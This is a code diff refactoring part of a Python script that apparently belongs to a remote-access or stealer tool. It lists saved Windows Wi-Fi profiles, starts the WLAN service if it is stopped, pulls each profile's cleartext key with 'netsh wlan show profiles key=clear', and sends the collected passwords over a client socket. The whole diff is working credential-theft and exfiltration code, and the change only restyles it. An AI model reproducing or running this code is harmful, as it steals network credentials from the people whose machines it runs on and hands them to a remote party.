@@ -6,7 +6,6 @@ import sys
 import subprocess
 
 def get_profiles():
-    passwd=''
     netsh_output = run_command("netsh wlan show profiles")
     if "not running" in netsh_output:
         net_wlan = run_command("net start wlansvc")
@@ -16,14 +15,12 @@ def get_profiles():
             return net_wlan
     if "no wireless interface" in netsh_output:
         return netsh_output
-    else:
-        profiles=re.findall(': (.*)\r',netsh_output)
-        for x in profiles:
-            output= run_command('netsh wlan show profiles "{}" key=clear'.format(x))
-            #output=re.findall('(Key Content.*)\r',proc)
-            if output:
-                passwd += "\n{}\n{}\n\n".format(x,output)
-        return passwd
+    profiles=re.findall(': (.*)\r',netsh_output)
+    passwd=''
+    for x in profiles:
+        if output := run_command(f'netsh wlan show profiles "{x}" key=clear'):
+            passwd += f"\n{x}\n{output}\n\n"
+    return passwd
 
 resp=get_profiles()
 send(client_socket,resp)
